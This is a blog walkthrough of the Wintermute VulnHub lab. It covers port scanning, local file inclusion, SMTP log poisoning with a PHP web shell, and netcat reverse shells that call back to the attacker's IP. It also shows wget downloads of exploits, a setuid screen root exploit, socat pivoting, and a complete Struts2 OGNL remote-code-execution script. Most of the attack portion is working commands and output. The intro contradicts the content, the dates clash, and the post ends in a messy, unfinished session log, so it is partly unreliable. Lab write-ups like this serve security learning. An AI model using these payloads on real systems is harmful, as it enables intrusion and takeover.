---
layout: post
title:  "Wintermute: Vulnhub Walkthrough"
date:   2019-01-01 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine that was created by [creosote][2], and hosted at [VulnHub][3]. Its part of a series called billu and offers great insights into machine breaking. It offers learners experience with different vulnerabilities such as LFI, SQL injection and privesc via kernel exploitation. As stated previously spoilers are a must. the machine is quite long we'll split into two parts. Hope you enjoy.

<!--more-->
## Information Gathering

First things first I'll explain how to set up the box.


nmap scan:
We'll be using `nmapAutomatomator`, source provided:
```
kali@kali:~/vulnhub/wintermute/192.168.251.5$ cat nmap/Quick_192.168.251.5.nmap 
# Nmap 7.80 scan initiated Wed Apr 15 12:21:07 2020 as: nmap -Pn -T4 --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit --open -oN nmap/Quick_192.168.251.5.nmap 192.168.251.5
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.251.5
Host is up (0.00075s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
```
Navigating to the home page
Port 80

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-1.png)

Which re-directs to this:

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-2.png)

Next we'll investigater port 3000:
 
http://192.168.251.5:3000/lua/login.lua?referer=/
 
![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-3.png)

Hint: the default user and password are admin. Use these credentials and we're in.

Once we're in change the `Interfaces > lo`. Next click on the `Flows` tab. Once here we find two links `/turing-bolo/ ` and `freeside`.


![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-4.png)
 
 
http://192.168.251.5/freeside

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-5.png)

Nothing of interest here:

http://192.168.251.5/turing-bolo/
 
![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-6.png) 

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-7.png)
When we click `Submit Query` we're taken to this link, `http://192.168.251.5/turing-bolo/bolo.php?bolo=case`.

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-8.png)


Smells of LFI, since we've got the `=` sign. When try using `../../../../../etc/passwd` we get no results. However when we try to navigate to the root of the directory; taking a hint from this page we can go to any of these directories.

    http://192.168.251.5/turing-bolo/case.log
    http://192.168.251.5/turing-bolo/molly.log
    http://192.168.251.5/turing-bolo/armitage.log
    http://192.168.251.5/turing-bolo/riviera.log
    
Are all available? Yes. Hence LFI is confirmed.

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-9.png)


We can make two conclusion:
1. we can only execute files that end with the `.log` extension
2. we're using a version of php higher than php 5.3 as we can't append the nullbyte `%00` or question mark ? to get around execution.

http://192.168.251.7/turing-bolo/bolo.php?bolo=../../../../../var/www/html/turing-bolo/case

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-10.png)

Remember earlier we found smtp
25/tcp   open  smtp            Postfix smtpd
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
We'll start hunting for the logs.
A Google search tell where the logs can be found `var/log/mail.log`.
Guess what its in log file

http://192.168.251.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail

For an easier read. 
```
view-source:http://192.168.251.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail. 

Apr 14 19:24:31 straylight postfix/smtpd[4787]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4787]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4787]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4787]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4787]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4786]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4786]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4723]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4723]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4736]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4736]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4736]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4736]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4736]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4723]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4723]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max connection rate 21/60s for (smtp:192.168.251.4) at Apr 14 19:24:31
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max connection count 4 for (smtp:192.168.251.4) at Apr 14 19:21:15
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max cache size 2 at Apr 14 19:21:08
Apr 15 04:14:16 straylight postfix/postfix-script[759]: starting the Postfix mail system
Apr 15 04:14:16 straylight postfix/master[761]: daemon started -- version 3.1.8, configuration /etc/postfix
All the activities have been logged including those during the scan process.
```
We can also use `PayloadsAllTheThings/File\ Inclusion/Intruders/` and wfuzz to bruteforce for possible directories.

Create a list as follows:

    kali@kali:~$ grep '.log$' PayloadsAllTheThings/File\ Inclusion/Intruders/*.txt | grep -Eiv  "windows|\mac" | cut -d ":" -f 2 | awk -F ".log$" '{print $1}'  > Logs,txt

Using the newly created list attempt to bruteforce for other possible directories.
```
kali@kali:~$ cd vulnhub/wintermute/ && wfuzz -c -z file,Logs,txt --hl 27 http://192.168.251.7/turing-bolo/bolo.php?bolo=FUZZ


Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.251.7/turing-bolo/bolo.php?bolo=FUZZ
Total requests: 370

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000269:   200        312 L    2998 W   30789 Ch    "/var/log/mail"

Total time: 1.762120
Processed Requests: 370
Filtered Requests: 368
Requests/sec.: 209.9742

```
We get the results we had before, work checking whilst doing other machines.

Next step is to do some log poisoning. Using `PayloadsAllTheThings/File\ Inclusion/ `

Please note:
    mail from: <tmix@dany.ke>
    rcpt to: <?php  -r '$sock=fsockopen("192.168.251.4",4242);exec("/bin/sh -i <&3 >&3 2>&3");'  ?>

Using this payload for RCE kills the port 

We'll stick to safety

```
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
_subject: <?php echo system($_REQUEST["cmd"]); ?>_
data2

```
In some cases you can also send the email with the 
```
mail from: <tmix@dany.ke>
rcpt to: <?php echo system ($_REQUEST['cmd']); ?>
```
Next we need to send a reverse shell
Go to pentest monkey for some payloads; 
We'll use:

    curl -v http://192.168.251.7/turing-bolo/bolo.php?bolo=../../../var/log/mail \
    --data-urlencode \
    'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.251.4 4242 >/tmp/f'

Start the listener, and we get a connection once the command above is executed
```
kali@kali:~$ nc -lnvp 4242

listening on [any] 4242 ...
connect to [192.168.251.4] from (UNKNOWN) [192.168.251.7] 42346
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@straylight:/var/www/html/turing-bolo$ ^Z
[1]+  Stopped                 nc -lnvp 4242
kali@kali:~$ stty raw -echo


www-data@straylight:/var/www/html/turing-bolo$ export TERM=xterm
```
Download enumeration scripts; First spin a python server on Attack box:

    kali@kali:~$ cd postexp && sudopython -m SimpleHTTPServer 80

Then download the scipts,
```
www-data@straylight:/dev/shm$ wget -r -np 192.168.251.4/

www-data@straylight:/dev/shm/192.168.251.4:8000$ bash les.sh
```
No kernel exploit is available

    www-data@straylight:/dev/shm/192.168.251.4:8000$ bash LinEnum.sh

Going through the report shows, there's a second network interface. Its connected to another machine.
```
### NETWORKING  ##########################################
[-] Network and IP info:
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.251.7  netmask 255.255.255.0  broadcast 192.168.251.255
        inet6 fe80::a00:27ff:fedf:21fb  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:df:21:fb  txqueuelen 1000  (Ethernet)
        RX packets 2133  bytes 708829 (692.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 458  bytes 78051 (76.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.219.8  netmask 255.255.255.0  broadcast 192.168.219.255
        inet6 fe80::a00:27ff:fe4f:a80c  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4f:a8:0c  txqueuelen 1000  (Ethernet)
        RX packets 951  bytes 500750 (489.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 3832 (3.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

...
```
We scan for other networks:


From LinEnum.sh shows

    -rwsr-xr-x 1 root root 1543016 May 12  2018 /bin/screen-4.5.0

kali@kali:~$ searchsploit screen 4.5

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-11.png)

Downlaod the exploit
```
www-data@straylight:/dev/shm/192.168.251.4:8000$ wget 192.168.251.4:8000/41154.sh
--2020-04-19 18:07:28--  http://192.168.251.4:8000/41154.sh
Connecting to 192.168.251.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1151 (1.1K) [text/x-sh]
Saving to: '41154.sh'

41154.sh                            0%[                                           41154.sh                          100%[==========================================================>]   1.12K  --.-KB/s    in 0s

2020-04-19 18:07:28 (96.2 MB/s) - '41154.sh' saved [1151/1151]

www-data@straylight:/dev/shm/192.168.251.4:8000$ head 41154.sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
www-data@straylight:/dev/shm/192.168.251.4:8000$ bash 41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
We're now in as root. Remember we're not done yet. When looking around in root we find a note left for us.
```
# python -c "import pty;pty.spawn('/bin/bash')"
root@straylight:/etc# cd /root
 
root@straylight:/root# cat note.txt

Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
```
Previously we'd noted that there was 2 interface cards, hence we'll ping to fing the other IP addresses;
```
root@straylight:/etc# for i in {1..254};do (ping 192.168.219.$i -c 1 -w 5 > /dev/null && echo "192.168.219.$i" &) ; done
192.168.219.1
192.168.219.2
_192.168.219.6_
192.168.219.8
```
The ip of the machine is underscored above. Next thing we do is an port scan of that ip address.
```
root@straylight:/etc# nc -nvz -w 1 192.168.219.6 1-65535
(UNKNOWN) [192.168.219.6] 34483 (?) open
(UNKNOWN) [192.168.219.6] 8080 (http-alt) open
(UNKNOWN) [192.168.219.6] 8009 (?) open
```
We get 3 open ports 8009, 8080, 34483. Previously from LinEnum we found that socat is installed we shall use it to forward this ports to our address.
Using socat;
This activity was such a minder bender:
Lets break it down
```
socat tcp-listen:8009,fork tcp:192.168.219.6:8009 &
socat tcp-listen:8080,fork tcp:192.168.219.6:8080 &
socat tcp-listen:34483,fork tcp:192.168.219.6:34483 &

socat tcp-listen:4321,fork tcp:192.168.251.4:4321 &
```
![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-12.png)

As part of the port forwarding we'll be hitting the second interface of straylight:
Create a rs.sh

```
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.219.8 4321 >/tmp/f 
```
Using exploit.sh
```
kali@kali:~/vulnhub/wintermute/privesc$ ./exploit.sh "wget 192.168.251.4:4321/rs.sh -O /tmp/rs.sh && cd /tmp && chmod 400 rs.sh"
kali@kali:~/vulnhub/wintermute/privesc$ ./exploit.sh "wget 192.168.219.8:4321/rs.sh -O /tmp/rs.sh && cd /tmp && chmod 400 rs.sh"
kali@kali:~/vulnhub/wintermute/privesc$ ./exploit.sh "cd /tmp && ./rs.sh"
kali@kali:~/vulnhub/wintermute/privesc$ n
kali@kali:~/vulnhub/wintermute/privesc$ ssh Lady3Jane@192.168.251.7 -p 34483
The authenticity of host '[192.168.251.7]:34483 ([192.168.251.7]:34483)' can't be established.
ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.251.7]:34483' (ECDSA) to the list of known hosts.
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Lady3Jane@192.168.251.7: Permission denied (publickey,password).
kali@kali:~/vulnhub/wintermute/privesc$ ssh Lady3Jane@192.168.251.7 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Lady3Jane@192.168.251.7: Permission denied (publickey,password).
kali@kali:~/vulnhub/wintermute/privesc$ ssh ta@192.168.251.7 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
ta@192.168.251.7's password:
Permission denied, please try again.
ta@192.168.251.7's password:
Permission denied, please try again.
ta@192.168.251.7's password:
ta@192.168.251.7: Permission denied (publickey,password).
kali@kali:~/vulnhub/wintermute/privesc$ searchsploit linux 4.4.0-116
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
                                         | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4 | exploits/linux/local/44298.c
----------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~/vulnhub/wintermute/privesc$ mkdir neuromancer
kali@kali:~/vulnhub/wintermute/privesc$ cd neuromancer/
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ searchsploit -x exploits/linux/local/44298.c
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
File Type: C source, ASCII text, with CRLF line terminators



kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ cp /usr/share/exploitdb/exploits/linux/local/44298.c .
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ ls
44298.c
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ head 44298.c
/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ gcc 44298.c 44298
gcc: error: 44298: No such file or directory
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ gcc 44298.c -o 44298
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
^CTraceback (most recent call last):
  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
    "__main__", fname, loader, pkg_name)
  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
    exec code in run_globals
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
    test()
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
    BaseHTTPServer.test(HandlerClass, ServerClass)
  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
    httpd.serve_forever()
  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
    poll_interval)
  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
    return func(*args)
KeyboardInterrupt
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ python -m SimpleHTTPServer 4321
Serving HTTP on 0.0.0.0 port 4321 ...
192.168.251.7 - - [01/May/2020 08:31:01] "GET /44298 HTTP/1.1" 200 -



^CTraceback (most recent call last):
  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
    "__main__", fname, loader, pkg_name)
  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
    exec code in run_globals
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
    test()
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
    BaseHTTPServer.test(HandlerClass, ServerClass)
  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
    httpd.serve_forever()
  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
    poll_interval)
  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
    return func(*args)
KeyboardInterrupt
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ ssh-keygen -t rsa -b 2048
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/vulnhub/wintermute/.ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Saving key "/home/kali/vulnhub/wintermute/.ssh/id_rsa" failed: No such file or directory
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ ls cd ..
ls: cannot access 'cd': No such file or directory
..:
41154.sh  44556.py  45260.py  exploit.sh   rs.sh
42324.py  45010     47163.c   neuromancer
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ cd ../..
kali@kali:~/vulnhub/wintermute$ ls
192.168.251.5                Log_Files.txt   loved.txt        wintermute.wfuzz
192.168.251.7                Logs-files.txt  privesc
List_Of_File_To_Include.txt  log.txt         wintermute.nmap
kali@kali:~/vulnhub/wintermute$ ls -lah
total 84K
drwxr-xr-x 5 kali kali 4.0K Apr 28 16:33 .
drwxr-xr-x 4 kali kali 4.0K Apr 28 09:54 ..
drwxr-xr-x 4 kali kali 4.0K Apr 15 12:25 192.168.251.5
drwxr-xr-x 3 kali kali 4.0K Apr 20 14:10 192.168.251.7
-rw-r--r-- 1 kali kali  24K Apr 28 16:31 List_Of_File_To_Include.txt
-rw-r--r-- 1 kali kali 9.7K Apr 28 16:32 Log_Files.txt
-rw-r--r-- 1 kali kali    3 Apr 28 16:27 Logs-files.txt
-rw-r--r-- 1 kali kali   30 Apr 28 15:17 log.txt
-rw-r--r-- 1 kali kali 8.6K Apr 28 16:38 loved.txt
drwxr-xr-x 3 kali kali 4.0K May  1 08:25 privesc
-rw-r--r-- 1 kali kali 1.6K Apr  8 18:17 wintermute.nmap
-rw-r--r-- 1 kali kali 3.1K Apr  8 19:47 wintermute.wfuzz
kali@kali:~/vulnhub/wintermute$ mkdir .ssh
kali@kali:~/vulnhub/wintermute$ ssh lady3jane@192.168.251.7 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
lady3jane@192.168.251.7's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


lady3jane@neuromancer:~$ exit
logout
Connection to 192.168.251.7 closed.
kali@kali:~/vulnhub/wintermute$ ssh Lady3Jane@192.168.251.7 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:

kali@kali:~/vulnhub/wintermute$ ls privesc/n
ls: cannot access 'privesc/n': No such file or directory
kali@kali:~/vulnhub/wintermute$ ls privesc/
41154.sh     44556.py     45260.py     exploit.sh   rs.sh
42324.py     45010        47163.c      neuromancer/
kali@kali:~/vulnhub/wintermute$ ls privesc/exploit.sh
privesc/exploit.sh
kali@kali:~/vulnhub/wintermute$ cat privesc/exploit.sh
#!/bin/bash

LHOST=192.168.251.4
LPORT=6666
RHOST=192.168.251.7
RPORT=8080
TARGETURI=struts2_2.3.15.1-showcase/integration
URL=http://$RHOST:$RPORT/$TARGETURI/saveGangster.action
CMD="$1"
PAYLOAD=""
PAYLOAD="${PAYLOAD}%{"
PAYLOAD="${PAYLOAD}(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
PAYLOAD="${PAYLOAD}(#_memberAccess?(#_memberAccess=#dm):"
PAYLOAD="${PAYLOAD}((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
PAYLOAD="${PAYLOAD}(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedPackageNames().clear())."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedClasses().clear())."
PAYLOAD="${PAYLOAD}(#context.setMemberAccess(#dm))))."
PAYLOAD="${PAYLOAD}(@java.lang.Runtime@getRuntime().exec('$CMD'))"
PAYLOAD="${PAYLOAD}}"

usage() {
          echo "Usage: $(basename $0) [COMMAND]" >&2
            exit 1
    }

if [ $# -ne 1 ]; then
          usage
fi

curl -s \
             -H "Referer: http://$RHOST:$RPORT/$TARGETURI/editGangster" \
                  --data-urlencode "name=$PAYLOAD" \
                       --data-urlencode "age=20" \
                            --data-urlencode "__checkbox_bustedBefore=true" \
                                 --data-urlencode "description=1" \
                                      -o /dev/null \
                                           $URL
kali@kali:~/vulnhub/wintermute$

```




Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].

[jekyll]:      http://jekyllrb.com
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-help]: https://github.com/jekyll/jekyll-help

[1]: https://www.vulnhub.com/entry/wintermute-1,239/
[2]: https://twitter.com/@_creosote
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
